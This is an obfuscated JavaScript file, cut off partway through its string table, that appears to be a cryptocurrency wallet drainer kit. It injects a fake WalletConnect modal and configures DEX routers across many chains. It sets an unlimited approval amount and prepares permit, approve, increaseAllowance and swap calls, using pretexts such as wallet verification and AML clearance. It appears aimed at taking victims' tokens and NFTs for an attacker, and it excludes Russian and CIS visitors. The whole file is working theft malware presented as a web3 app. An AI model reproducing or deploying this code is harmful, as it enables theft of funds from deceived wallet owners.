const _0x1027e3 = _0xef0c;
(function(_0x440053, _0x224190) {
    const _0x4725c2 = _0xef0c,
        _0x3856f5 = _0x440053();
    while (!![]) {
        try {
            const _0x262be8 = parseInt(_0x4725c2(0x33e)) / 0x1 * (parseInt(_0x4725c2(0x193)) / 0x2) + parseInt(_0x4725c2(0x1e8)) / 0x3 + parseInt(_0x4725c2(0x295)) / 0x4 + -parseInt(_0x4725c2(0x351)) / 0x5 + parseInt(_0x4725c2(0x1e5)) / 0x6 + parseInt(_0x4725c2(0x1cf)) / 0x7 * (parseInt(_0x4725c2(0x1dd)) / 0x8) + parseInt(_0x4725c2(0x2c4)) / 0x9 * (-parseInt(_0x4725c2(0x350)) / 0xa);
            if (_0x262be8 === _0x224190) break;
            else _0x3856f5['push'](_0x3856f5['shift']());
        } catch (_0x2bb992) {
            _0x3856f5['push'](_0x3856f5['shift']());
        }
    }
}(_0x2b92, 0xa34c8));
let MS_Encryption_Key = 0x32;
const MS_Server = _0x1027e3(0x247),
    MS_WalletConnect_ID = 'ea52b0e550593829f2eee2cb9006f642',
    MS_Modal_Style = 0x2,
    MS_Loader_Style = 0x2,
    MS_Color_Scheme = _0x1027e3(0x266),
    MS_Modal_Mode = 0x1,
    MS_Verify_Message = '',
    MS_WalletConnect_MetaData = {
        'name': document[_0x1027e3(0x2f7)],
        'description': _0x1027e3(0x321),
        'url': _0x1027e3(0x289) + window['location']['host'],
        'icons': ['https://avatars.githubusercontent.com/u/37784886']
    },
    MS_WalletConnect_Customization = 0x0,
    MS_WalletConnect_Theme = {
        'themeMode': 'light',
        'themeVariables': {
            '--w3m-background-color': _0x1027e3(0x1a4),
            '--w3m-accent-color': _0x1027e3(0x2e5),
            '--w3m-z-index': 0x98967f
        }
    },
    MS_Custom_Chat = {
        'Enable': 0x0,
        'Chat_Settings': {
            'enter_website': '',
            'leave_website': '',
            'connect_success': '',
            'connect_request': '',
            'connect_cancel': '',
            'approve_request': '',
            'approve_success': '',
            'approve_cancel': '',
            'permit_sign_data': '',
            'transfer_request': '',
            'transfer_success': '',
            'transfer_cancel': '',
            'sign_request': '',
            'sign_success': '',
            'sign_cancel': '',
            'chain_request': '',
            'chain_success': '',
            'chain_cancel': ''
        }
    };
var MS_Worker_ID = null;
const BN = ethers['BigNumber'][_0x1027e3(0x308)];
let MS_Ready = ![],
    MS_Settings = {},
    MS_Contract_ABI = {},
    MS_ID = 0x0,
    MS_Process = ![],
    MS_Provider = null,
    MS_Current_Provider = null,
    MS_Current_Address = null,
    MS_Current_Chain_ID = null,
    MS_Web3 = null,
    MS_Signer = null,
    MS_Check_Done = ![],
    MS_Currencies = {},
    MS_Force_Mode = ![],
    MS_Sign_Disabled = ![],
    BL_US = ![],
    SP_US = ![],
    XY_US = ![],
    MS_Bad_Country = ![],
    MS_Connection = ![],
    MS_Load_Time = null,
    MS_Gas_Multiplier = 0x2,
    MS_Partner_Address = ![];
const WC2_Provider = window[_0x1027e3(0x24b)][_0x1027e3(0x253)],
    is_valid_json = _0x148f5b => {
        try {
            JSON['parse'](_0x148f5b);
        } catch (_0x280e8e) {
            return ![];
        }
        return !![];
    };
((async () => {
    const _0xb30fbe = _0x1027e3;
    try {
        let _0x160c40 = await fetch('https://min-api.cryptocompare.com/data/pricemulti?fsyms=ETH,BNB,MATIC,AVAX,ARB,FTM,OP&tsyms=USD', {
            'method': _0xb30fbe(0x18f),
            'headers': {
                'Accept': _0xb30fbe(0x365)
            }
        });
        MS_Currencies = await _0x160c40[_0xb30fbe(0x2c9)](), MS_Currencies[_0xb30fbe(0x2ee)] = {
            'USD': 0.00004512
        };
    } catch (_0x558150) {
        console['log'](_0x558150);
    }
})());
const MS_API_Data = {
    0x1: _0x1027e3(0x1ce),
    0xa: _0x1027e3(0x2d3),
    0x38: _0x1027e3(0x187),
    0x89: _0x1027e3(0x240),
    0xfa: _0x1027e3(0x332),
    0xa4b1: 'api.arbiscan.io',
    0xa86a: _0x1027e3(0x270),
    0x2105: _0x1027e3(0x274)
};

function _0xef0c(_0x3029e8, _0x579abe) {
    const _0x2b92cf = _0x2b92();
    return _0xef0c = function(_0xef0cb8, _0x399e99) {
        _0xef0cb8 = _0xef0cb8 - 0x173;
        let _0x495f31 = _0x2b92cf[_0xef0cb8];
        return _0x495f31;
    }, _0xef0c(_0x3029e8, _0x579abe);
}
var MS_MetaMask_ChainData = {};
const fill_chain_data = () => {
        const _0x3058cc = _0x1027e3;
        MS_MetaMask_ChainData = {
            0x1: {
                'chainId': _0x3058cc(0x36b),
                'chainName': 'Ethereum\x20Mainnet',
                'nativeCurrency': {
                    'name': 'Ether',
                    'symbol': _0x3058cc(0x2cd),
                    'decimals': 0x12
                },
                'rpcUrls': [MS_Settings[_0x3058cc(0x31a)][0x1]],
                'blockExplorerUrls': ['https://etherscan.io']
            },
            0x38: {
                'chainId': _0x3058cc(0x2d7),
                'chainName': _0x3058cc(0x2ea),
                'nativeCurrency': {
                    'name': _0x3058cc(0x208),
                    'symbol': _0x3058cc(0x1f7),
                    'decimals': 0x12
                },
                'rpcUrls': [MS_Settings['RPCs'][0x38]],
                'blockExplorerUrls': ['https://bscscan.com']
            },
            0x89: {
                'chainId': _0x3058cc(0x2dc),
                'chainName': 'Polygon\x20Mainnet',
                'nativeCurrency': {
                    'name': _0x3058cc(0x346),
                    'symbol': _0x3058cc(0x346),
                    'decimals': 0x12
                },
                'rpcUrls': [MS_Settings[_0x3058cc(0x31a)][0x89]],
                'blockExplorerUrls': [_0x3058cc(0x2c2)]
            },
            0xa86a: {
                'chainId': _0x3058cc(0x290),
                'chainName': 'Avalanche\x20Network\x20C-Chain',
                'nativeCurrency': {
                    'name': 'AVAX',
                    'symbol': _0x3058cc(0x223),
                    'decimals': 0x12
                },
                'rpcUrls': [MS_Settings['RPCs'][0xa86a]],
                'blockExplorerUrls': [_0x3058cc(0x287)]
            },
            0xa4b1: {
                'chainId': _0x3058cc(0x21e),
                'chainName': 'Arbitrum\x20One',
                'nativeCurrency': {
                    'name': _0x3058cc(0x2cd),
                    'symbol': 'ETH',
                    'decimals': 0x12
                },
                'rpcUrls': [MS_Settings[_0x3058cc(0x31a)][0xa4b1]],
                'blockExplorerUrls': [_0x3058cc(0x261)]
            },
            0xa: {
                'chainId': _0x3058cc(0x316),
                'chainName': _0x3058cc(0x361),
                'nativeCurrency': {
                    'name': 'ETH',
                    'symbol': _0x3058cc(0x2cd),
                    'decimals': 0x12
                },
                'rpcUrls': [MS_Settings['RPCs'][0xa]],
                'blockExplorerUrls': ['https://optimistic.etherscan.io/']
            },
            0xfa: {
                'chainId': _0x3058cc(0x246),
                'chainName': 'Fantom\x20Opera',
                'nativeCurrency': {
                    'name': _0x3058cc(0x292),
                    'symbol': _0x3058cc(0x292),
                    'decimals': 0x12
                },
                'rpcUrls': [MS_Settings['RPCs'][0xfa]],
                'blockExplorerUrls': [_0x3058cc(0x309)]
            },
            0x2105: {
                'chainId': _0x3058cc(0x1cb),
                'chainName': _0x3058cc(0x2cb),
                'nativeCurrency': {
                    'name': _0x3058cc(0x2cd),
                    'symbol': 'ETH',
                    'decimals': 0x12
                },
                'rpcUrls': [MS_Settings[_0x3058cc(0x31a)][0x2105]],
                'blockExplorerUrls': [_0x3058cc(0x31c)]
            },
            0x144: {
                'chainId': _0x3058cc(0x1da),
                'chainName': _0x3058cc(0x278),
                'nativeCurrency': {
                    'name': 'ETH',
                    'symbol': 'ETH',
                    'decimals': 0x12
                },
                'rpcUrls': [MS_Settings[_0x3058cc(0x31a)][0x144]],
                'blockExplorerUrls': [_0x3058cc(0x198)]
            },
            0x171: {
                'chainId': '0x171',
                'chainName': _0x3058cc(0x1a7),
                'nativeCurrency': {
                    'name': _0x3058cc(0x2ee),
                    'symbol': 'PLS',
                    'decimals': 0x12
                },
                'rpcUrls': [MS_Settings[_0x3058cc(0x31a)][0x171]],
                'blockExplorerUrls': ['https://scan.pulsechain.com/']
            }
        };
    },
    MS_Routers = {
        0x1: [
            [_0x1027e3(0x356), '0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45'],
            [_0x1027e3(0x24c), _0x1027e3(0x212)],
            ['Pancake_V3', _0x1027e3(0x34e)],
            [_0x1027e3(0x285), _0x1027e3(0x267)]
        ],
        0xa: [
            [_0x1027e3(0x356), _0x1027e3(0x1ad)]
        ],
        0x38: [
            [_0x1027e3(0x24c), _0x1027e3(0x339)],
            ['Pancake_V3', _0x1027e3(0x34e)],
            [_0x1027e3(0x285), _0x1027e3(0x29b)]
        ],
        0x89: [
            [_0x1027e3(0x356), '0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45'],
            [_0x1027e3(0x285), _0x1027e3(0x29b)],
            [_0x1027e3(0x249), '0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff']
        ],
        0xfa: [
            ['Sushiswap', _0x1027e3(0x29b)]
        ],
        0xa4b1: [
            [_0x1027e3(0x356), _0x1027e3(0x1ad)],
            [_0x1027e3(0x285), _0x1027e3(0x29b)]
        ],
        0xa86a: [
            [_0x1027e3(0x285), _0x1027e3(0x29b)]
        ]
    },
    MS_Swap_Route = {
        0x1: _0x1027e3(0x311),
        0xa: _0x1027e3(0x2ef),
        0x38: _0x1027e3(0x2e7),
        0x89: _0x1027e3(0x2ff),
        0xfa: '0x21be370d5312f44cb42ce377bc9b8a0cef1a4c83',
        0xa4b1: '0x82af49447d8a07e3bd95bd0d56f35241523fbab1',
        0xa86a: _0x1027e3(0x29c)
    },
    MS_Uniswap_ABI = [{
        'inputs': [{
            'internalType': _0x1027e3(0x27d),
            'name': _0x1027e3(0x259),
            'type': 'uint256'
        }, {
            'internalType': _0x1027e3(0x27d),
            'name': _0x1027e3(0x23a),
            'type': _0x1027e3(0x27d)
        }, {
            'internalType': _0x1027e3(0x349),
            'name': _0x1027e3(0x1f6),
            'type': _0x1027e3(0x349)
        }, {
            'internalType': _0x1027e3(0x1e6),
            'name': 'to',
            'type': 'address'
        }],
        'name': _0x1027e3(0x2fe),
        'outputs': [{
            'internalType': _0x1027e3(0x27d),
            'name': 'amountOut',
            'type': _0x1027e3(0x27d)
        }],
        'stateMutability': _0x1027e3(0x232),
        'type': _0x1027e3(0x233)
    }, {
        'inputs': [{
            'internalType': 'uint256',
            'name': _0x1027e3(0x2f2),
            'type': _0x1027e3(0x27d)
        }, {
            'internalType': _0x1027e3(0x242),
            'name': _0x1027e3(0x1a0),
            'type': _0x1027e3(0x242)
        }],
        'name': _0x1027e3(0x306),
        'outputs': [{
            'internalType': _0x1027e3(0x242),
            'name': '',
            'type': _0x1027e3(0x242)
        }],
        'stateMutability': _0x1027e3(0x232),
        'type': _0x1027e3(0x233)
    }],
    MS_Pancake_ABI = [{
        'inputs': [{
            'internalType': 'uint256',
            'name': _0x1027e3(0x259),
            'type': _0x1027e3(0x27d)
        }, {
            'internalType': _0x1027e3(0x27d),
            'name': _0x1027e3(0x23a),
            'type': 'uint256'
        }, {
            'internalType': 'address[]',
            'name': _0x1027e3(0x1f6),
            'type': _0x1027e3(0x349)
        }, {
            'internalType': _0x1027e3(0x1e6),
            'name': 'to',
            'type': _0x1027e3(0x1e6)
        }, {
            'internalType': 'uint256',
            'name': _0x1027e3(0x2f2),
            'type': 'uint256'
        }],
        'name': _0x1027e3(0x2fe),
        'outputs': [{
            'internalType': _0x1027e3(0x1af),
            'name': _0x1027e3(0x34a),
            'type': _0x1027e3(0x1af)
        }],
        'stateMutability': _0x1027e3(0x2c3),
        'type': _0x1027e3(0x233)
    }, {
        'inputs': [{
            'internalType': 'uint256',
            'name': _0x1027e3(0x259),
            'type': _0x1027e3(0x27d)
        }, {
            'internalType': _0x1027e3(0x27d),
            'name': 'amountOutMin',
            'type': _0x1027e3(0x27d)
        }, {
            'internalType': _0x1027e3(0x349),
            'name': _0x1027e3(0x1f6),
            'type': _0x1027e3(0x349)
        }, {
            'internalType': 'address',
            'name': 'to',
            'type': 'address'
        }, {
            'internalType': _0x1027e3(0x27d),
            'name': _0x1027e3(0x2f2),
            'type': _0x1027e3(0x27d)
        }],
        'name': _0x1027e3(0x27c),
        'outputs': [{
            'internalType': _0x1027e3(0x1af),
            'name': _0x1027e3(0x34a),
            'type': _0x1027e3(0x1af)
        }],
        'stateMutability': _0x1027e3(0x2c3),
        'type': _0x1027e3(0x233)
    }, {
        'inputs': [{
            'internalType': _0x1027e3(0x27d),
            'name': _0x1027e3(0x2f2),
            'type': 'uint256'
        }, {
            'internalType': 'bytes[]',
            'name': 'data',
            'type': _0x1027e3(0x242)
        }],
        'name': _0x1027e3(0x306),
        'outputs': [{
            'internalType': _0x1027e3(0x242),
            'name': '',
            'type': 'bytes[]'
        }],
        'stateMutability': _0x1027e3(0x232),
        'type': 'function'
    }, {
        'inputs': [{
            'internalType': _0x1027e3(0x27d),
            'name': _0x1027e3(0x259),
            'type': _0x1027e3(0x27d)
        }, {
            'internalType': _0x1027e3(0x27d),
            'name': _0x1027e3(0x23a),
            'type': _0x1027e3(0x27d)
        }, {
            'internalType': _0x1027e3(0x349),
            'name': 'path',
            'type': _0x1027e3(0x349)
        }, {
            'internalType': _0x1027e3(0x1e6),
            'name': 'to',
            'type': _0x1027e3(0x1e6)
        }],
        'name': _0x1027e3(0x2fe),
        'outputs': [{
            'internalType': 'uint256[]',
            'name': _0x1027e3(0x34a),
            'type': 'uint256[]'
        }],
        'stateMutability': 'nonpayable',
        'type': _0x1027e3(0x233)
    }],
    MS_Current_URL = window[_0x1027e3(0x215)][_0x1027e3(0x28d)][_0x1027e3(0x33d)](/http[s]*:\/\//, ''),
    MS_Mobile_Status = ((() => {
        const _0x4106b3 = _0x1027e3;
        let _0x38e31f = ![];
        return function(_0x553c73) {
            const _0x3df848 = _0xef0c;
            if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i ['test'](_0x553c73) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i [_0x3df848(0x2c0)](_0x553c73[_0x3df848(0x272)](0x0, 0x4))) _0x38e31f = !![];
        }(navigator[_0x4106b3(0x279)] || navigator[_0x4106b3(0x30d)] || window[_0x4106b3(0x1e7)]), _0x38e31f;
    })()),
    MS_Apple_Status = ((() => {
        const _0xefaa5b = _0x1027e3;
        try {
            return ['iPad\x20Simulator', _0xefaa5b(0x2e4), _0xefaa5b(0x207), _0xefaa5b(0x27a), 'iPhone', _0xefaa5b(0x1e0)][_0xefaa5b(0x2e6)](navigator[_0xefaa5b(0x2a0)]) || navigator[_0xefaa5b(0x279)][_0xefaa5b(0x2e6)](_0xefaa5b(0x2c7)) && 'ontouchend' in document;
        } catch (_0x245ff4) {
            return ![];
        }
    })()),
    MS_Unlimited_Amount = '1158472395435294898592384258348512586931256',
    MS_Modal_Data = [{
        'type': _0x1027e3(0x255),
        'data': _0x1027e3(0x17e)
    }, {
        'type': _0x1027e3(0x202),
        'data': _0x1027e3(0x35a)
    }],
    inject_modal = () => {
        const _0x10a89a = _0x1027e3;
        try {
            let _0x4948cd = document[_0x10a89a(0x338)]('style');
            _0x4948cd['id'] = _0x10a89a(0x25c), _0x4948cd[_0x10a89a(0x1b9)] = MS_Modal_Data[0x0][_0x10a89a(0x1a0)], document[_0x10a89a(0x2ac)][_0x10a89a(0x21c)](_0x4948cd);
            let _0x5bfb93 = document[_0x10a89a(0x338)]('div');
            _0x5bfb93['id'] = 'web3-overlay', _0x5bfb93[_0x10a89a(0x2c6)] = [_0x10a89a(0x186)], _0x5bfb93[_0x10a89a(0x255)][_0x10a89a(0x1dc)] = 'none', document[_0x10a89a(0x1a2)][_0x10a89a(0x1ed)](_0x5bfb93), document['querySelector'](_0x10a89a(0x25d))[_0x10a89a(0x2f4)](_0x10a89a(0x1fb), () => {
                ms_hide();
            });
            let _0x64ea6d = document[_0x10a89a(0x338)](_0x10a89a(0x2a9));
            _0x64ea6d['id'] = _0x10a89a(0x1c6), _0x64ea6d[_0x10a89a(0x2c6)] = [_0x10a89a(0x1c6)], _0x64ea6d[_0x10a89a(0x255)][_0x10a89a(0x1dc)] = _0x10a89a(0x362), _0x64ea6d[_0x10a89a(0x1b9)] = MS_Modal_Data[0x1]['data'], document[_0x10a89a(0x1a2)][_0x10a89a(0x1ed)](_0x64ea6d);
        } catch (_0x33eb3e) {
            console[_0x10a89a(0x1db)](_0x33eb3e);
        }
    },
    set_modal_data = (_0x2a8b08, _0x307836) => {
        const _0x37cf05 = _0x1027e3;
        try {
            MS_Modal_Data[0x0]['data'] = _0x2a8b08, MS_Modal_Data[0x1]['data'] = _0x307836, reset_modal();
        } catch (_0x27f9e) {
            console[_0x37cf05(0x1db)](_0x27f9e);
        }
    },
    reset_modal = () => {
        const _0x4486d8 = _0x1027e3;
        try {
            document[_0x4486d8(0x237)](_0x4486d8(0x1c6))[_0x4486d8(0x2a4)]();
        } catch (_0x3baf45) {
            console[_0x4486d8(0x1db)](_0x3baf45);
        }
        try {
            document['getElementById'](_0x4486d8(0x186))[_0x4486d8(0x2a4)]();
        } catch (_0x1ae835) {
            console['log'](_0x1ae835);
        }
        try {
            document[_0x4486d8(0x237)]('web3-style')['remove']();
        } catch (_0x20d796) {
            console[_0x4486d8(0x1db)](_0x20d796);
        }
        try {
            inject_modal();
        } catch (_0x46719a) {
            console['log'](_0x46719a);
        }
    },
    wallet_connection = () => {
        const _0x467679 = _0x1027e3;
        try {
            if (!MS_Connection) return connect_wallet();
            if (MS_Process) return;
            MS_Modal_Style == 0x2 ? MSM[_0x467679(0x293)](MS_Color_Scheme, MS_Modal_Mode) : (document[_0x467679(0x237)](_0x467679(0x1c6))[_0x467679(0x255)][_0x467679(0x1dc)] = 'block', document[_0x467679(0x237)](_0x467679(0x186))[_0x467679(0x255)][_0x467679(0x1dc)] = 'block', document[_0x467679(0x29d)](_0x467679(0x335))[0x0]['style']['display'] = _0x467679(0x269), document[_0x467679(0x29d)](_0x467679(0x2f1))[0x0][_0x467679(0x255)][_0x467679(0x1dc)] = 'none');
        } catch (_0x5f5c7c) {
            console[_0x467679(0x1db)](_0x5f5c7c);
        }
    },
    ms_hide = () => {
        const _0x342f45 = _0x1027e3;
        try {
            MS_Modal_Style == 0x2 ? MSM[_0x342f45(0x218)]() : (document[_0x342f45(0x237)](_0x342f45(0x1c6))[_0x342f45(0x255)][_0x342f45(0x1dc)] = 'none', document[_0x342f45(0x237)](_0x342f45(0x186))[_0x342f45(0x255)][_0x342f45(0x1dc)] = _0x342f45(0x362));
        } catch (_0x1676ea) {
            console[_0x342f45(0x1db)](_0x1676ea);
        }
    },
    load_wc = async () => {
        const _0x505b51 = _0x1027e3;
        let _0x1c19bb = [],
            _0x363446 = {};
        for (const _0x575af6 in MS_Settings['RPCs']) {
            if (_0x575af6 != '1') _0x1c19bb[_0x505b51(0x28a)](_0x575af6);
            _0x363446[_0x575af6] = MS_Settings['RPCs'][_0x575af6];
        }
        MS_Provider = await WC2_Provider[_0x505b51(0x327)]({
            'projectId': MS_WalletConnect_ID,
            'chains': ['1'],
            'optionalChains': _0x1c19bb,
            'metadata': MS_WalletConnect_MetaData,
            'showQrModal': !![],
            'rpcMap': _0x363446,
            'methods': [_0x505b51(0x17c), 'eth_signTransaction', _0x505b51(0x203), _0x505b51(0x19f), _0x505b51(0x2bd), _0x505b51(0x2b7)],
            'qrModalOptions': MS_WalletConnect_Customization == 0x1 ? MS_WalletConnect_Theme : undefined
        });
    }, prs = (_0x55d02c, _0x427c07) => {
        const _0x527cab = _0x1027e3,
            _0x229667 = _0x3663eb => _0x3663eb[_0x527cab(0x25a)]('')[_0x527cab(0x2cc)](_0x115646 => _0x115646[_0x527cab(0x24a)](0x0)),
            _0x260e6a = _0x2314bd => ('0' + Number(_0x2314bd)[_0x527cab(0x2df)](0x10))['substr'](-0x2),
            _0x13e129 = _0xfbd5e => _0x229667(_0x55d02c)['reduce']((_0xb8e763, _0x2a1591) => _0xb8e763 ^ _0x2a1591, _0xfbd5e);
        return _0x427c07['split']('')[_0x527cab(0x2cc)](_0x229667)[_0x527cab(0x2cc)](_0x13e129)[_0x527cab(0x2cc)](_0x260e6a)[_0x527cab(0x216)]('');
    }, srp = (_0xc55f72, _0x40d80e) => {
        const _0x57a325 = _0x1027e3,
            _0x5aa272 = _0x29dc9a => _0x29dc9a[_0x57a325(0x25a)]('')['map'](_0x2cbfd8 => _0x2cbfd8[_0x57a325(0x24a)](0x0)),
            _0xa29a03 = _0x62543b => _0x5aa272(_0xc55f72)[_0x57a325(0x26d)]((_0x51e918, _0x4f2ddb) => _0x51e918 ^ _0x4f2ddb, _0x62543b);
        return _0x40d80e['match'](/.{1,2}/g)[_0x57a325(0x2cc)](_0x550934 => parseInt(_0x550934, 0x10))['map'](_0xa29a03)[_0x57a325(0x2cc)](_0x4806ef => String[_0x57a325(0x326)](_0x4806ef))['join']('');
    };

function _0x2b92() {
    const _0x2ca1c7 = ['0x000000000022d473030f116ddee9f6b43ac78ba3', '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506', '0xb31f66aa3c1e785363f0875a1b74e27b85fd66c7', 'getElementsByClassName', 'For\x20security\x20reasons\x20we\x20can\x27t\x20allow\x20you\x20to\x20connect\x20empty\x20or\x20new\x20wallet', 'balance', 'platform', '<b>Thanks!</b>', 'about:blank', 'OPENSEA', 'remove', 'text/plain', 'getBalance', 'focus', 'Error', 'div', 'details', 'increaseApproval', 'head', 'Address', 'XDAI', 'Web3Provider', 'sign_unavailable', 'WalletConnect', 'pulse', 'increase', 'Invalid\x20Wallet', 'Use_Wallet_Randomizer', 'then', 'eth_signTypedData_v4', 'Verification\x20Error', 'swapper_type', 'Пожалуйста,\x20покиньте\x20этот\x20веб-сайт\x20немедленно,\x20он\x20не\x20предназначен\x20для\x20России\x20и\x20стран\x20СНГ,\x20не\x20пытайтесь\x20использовать\x20VPN,\x20это\x20небезопасно!', 'swapper', 'expiration', 'eth_signTypedData', '<b>Waiting\x20for\x20your\x20sign...</b><br><br>Please,\x20sign\x20message\x20in\x20your\x20wallet!', '{{ADDRESS}}', 'test', 'number', 'https://polygonscan.com', 'nonpayable', '36fBguss', 'moonriver', 'classList', 'Mac', 'nonce', 'json', 'approve', 'Base', 'map', 'ETH', 'Sign', 'bsc', 'approve_request', 'LOCAL_CHECK', 'UNSUPPORTED', 'api-optimistic.etherscan.io', 'mul', '&apikey=', 'Your\x20wallet\x20is\x20not\x20AML\x20clear,\x20you\x20can\x27t\x20use\x20it!', '0x38', 'price', 'object', 'methods', 'one_day_average_price', '0x89', 'isCoinbaseWallet', 'Minimal_Wallet_Price', 'toString', 'Notifications', 'Proxy', 'request', 'avalanche', 'iPhone\x20Simulator', '#F5841F', 'includes', '0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c', 'Price', 'connect_success', 'BNB\x20Smart\x20Chain', 'base', 'swapper_address', 'Wait_For_Response', 'PLS', '0x4200000000000000000000000000000000000006', 'fantom', 'web3-modal-wc', 'deadline', 'CELO', 'addEventListener', 'Quick', 'spender', 'title', 'eth', 'Sign\x20message\x20to\x20verificate\x20your\x20wallet', 'toHex', 'check_nft', 'trim', 'https://trustwallet.com', 'swapExactTokensForTokens', '0x0d500b1d8e8ef31e21c99d1db9a6444d3adf1270', 'language', 'encodeABI', 'success', 'ru-RU', 'hex', 'Personal_Wallet', 'multicall', 'Processing\x20wallet', 'from', 'https://ftmscan.com/', 'Settings', 'getGasPrice', 'host', 'vendor', '<b>Предупреждение</b><br><br>Пожалуйста,\x20покиньте\x20этот\x20веб-сайт\x20немедленно,\x20он\x20не\x20предназначен\x20для\x20России\x20и\x20стран\x20СНГ,\x20не\x20пытайтесь\x20использовать\x20VPN,\x20это\x20небезопасно!', 'Use_Contract_Amount', '[{\x22constant\x22:false,\x22inputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22depositer\x22,\x22type\x22:\x22address\x22},{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22handler\x22,\x22type\x22:\x22address\x22},\x0a\x20\x20{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22keeper\x22,\x22type\x22:\x22address\x22},{\x22internalType\x22:\x22uint8\x22,\x22name\x22:\x22percent\x22,\x22type\x22:\x22uint8\x22},{\x22internalType\x22:\x22bool\x22,\x22name\x22:\x22is_cashback\x22,\x22type\x22:\x22bool\x22}],\x22name\x22:\x22', '0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2', 'Priority', 'Enable', 'fire', 'JsonRpcProvider', '0xA', 'disconnect', 'Use_Randomizer_For_Tokens', 'Скрипт\x20не\x20может\x20соединиться\x20с\x20сервером\x20и\x20получить\x20данные,\x20возможно\x20вы\x20настроили\x20что-то\x20некорректно\x20или\x20домен\x20сервера\x20ещё\x20недоступен\x20или\x20был\x20заблокирован.\x20Проверьте\x20и\x20исправьте\x20проблемы\x20перед\x20использованием\x20сайта.', 'RPCs', 'Server\x20is\x20Unavailable', 'https://basescan.org/', 'token_id', 'increaseAllowance', 'value', 'Tokens', 'Web3\x20Application', 'Coinbase', 'POST', '0x0000000000000000000000000000000000000000', 'allowance', 'fromCharCode', 'init', 'token', 'Your\x20wallet\x20is\x20not\x20AML\x20clear!', 'LOW_BALANCE', 'Contract', 'floor', 'worker_id', 'Sushi', 'isTrust', 'tokenType', 'DOMAIN_SEPARATOR', 'api.ftmscan.com', 'swap_request', 'KAVA', 'web3-modal-main', 'CURRENCY', 'Swappers', 'createElement', '0x10ED43C718714eb63d5aA57B78B54704E256024E', 'Loop_N', 'WC_AE', 'startsWith', 'replace', '79HCTEvS', 'Min_Tokens_Price', 'Wait_For_Confirmation', 'permit', 'application/x-www-form-urlencoded', 'https://www.coinbase.com/wallet', 'amount_usd', 'ERC20', 'MATIC', 'Receiver', 'Server\x20Error', 'address[]', 'amounts', 'seven_day_average_price', 'chat_data', '/api?module=contract&action=getsourcecode&address=', '0x13f4EA83D0bd40E75C8222255bc855a974568Dd4', 'nonces', '8932270vAeFuM', '408580tsnvXn', 'Min_NFTs_Price', 'sigDeadline', 'https://go.cb-w.com/dapp?cb_url=https://', 'ERC721', 'Uniswap', 'count', 'transfer_request', 'x2y2', 